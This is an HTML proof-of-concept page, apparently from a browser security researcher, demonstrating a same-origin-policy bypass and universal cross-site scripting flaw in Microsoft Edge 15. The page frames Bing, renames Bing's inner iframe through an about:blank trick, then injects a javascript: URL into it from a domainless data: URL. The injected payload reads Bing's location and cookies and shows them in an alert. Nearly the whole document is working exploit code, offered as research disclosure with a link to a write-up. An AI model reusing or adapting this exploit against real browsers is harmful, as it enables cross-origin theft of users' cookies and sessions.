<!doctype html>
<html>
<head>
	<title>SOP bypass/UXSS on Microsoft Edge - domainless data-meta-data</title>
</head>
<body>
<div style="width:520px;text-align:center">
	<iframe width="500" height="300" src=http://www.bing.com/images/search?q=charles+darwin></iframe><br /><br />
	<input onclick="setNameToBingsInnerIframe()" value="[ 1 ] Set Bing's iframe name" type="button"/><br /><br />
	<iframe width="200" height="100" src="data:text/html,<meta http-equiv=refresh content=%220;url=data:text/html,<br /><center>I AM DOMAINLESS<br /><br /><input type=button onclick=window.open('javascript:alert(parent.location.href+parent.document.cookie)','CHARLES') value='[ 2 ] Inject Code in Bing' /></center>%22>"></iframe>
</div>
<br /><hr /><br />
<u>Tested on</u>: Microsoft Edge 40.15063.0.0 / EdgeHTML 15.15063
<br /><br />
<u>Explanation</u>: <a href="https://www.brokenbrowser.com/sop-bypass-uxss-tweeting-like-charles-darwin">SOP bypass / UXSS data-meta-data in a domainless world (Edge)</a>
<br /><br />
<u>Contact</u>: <a href="https://twitter.com/magicmac2000">@magicmac2000</a>

<script>
function setNameToBingsInnerIframe()
{
	// Sets the location of Bing's inner iframe to about:blank
	// But now it is in our domain so we can set a name to it.
	window[0][0].location = "about:blank";

	setTimeout(function()
	{
		// Set the inner iframe name to "CHARLES" so we can later inject code
		// using a window.open("javascript:[...]","CHARLES");
		window[0][0].name = "CHARLES";
		
		// Restore Bing's domain to the about:blank that we've just renamed.
		window[0][0].document.write('<meta http-equiv="refresh" content="0;url=about:blank">');
		window[0][0].document.close();
		
		alert("It's done! Now Bing's blank inner iframe is called 'CHARLES'.\n\nClick the [Inject Code in Bing] button below!");
	}
	, 500);

}

</script>


</body>
</html>